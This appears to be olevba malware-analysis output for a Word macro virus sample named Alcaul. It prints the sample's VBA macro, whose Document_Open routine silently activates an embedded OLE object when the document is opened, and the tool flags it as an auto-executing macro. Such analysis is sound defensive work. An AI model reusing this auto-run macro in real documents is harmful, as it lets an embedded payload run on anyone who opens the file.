olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alcaul-e011e6f708dd91a32b769fe7fc8fcffd0840869d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alcaul-e011e6f708dd91a32b769fe7fc8fcffd0840869d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open()
On Error Resume Next
'by alcopaul
obj = ActiveDocument.Shapes(1).OLEFormat.ClassType
With ActiveDocument.Shapes(1).OLEFormat
    .ActivateAs ClassType:=obj
    .Activate
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
+----------+--------------------+---------------------------------------------+

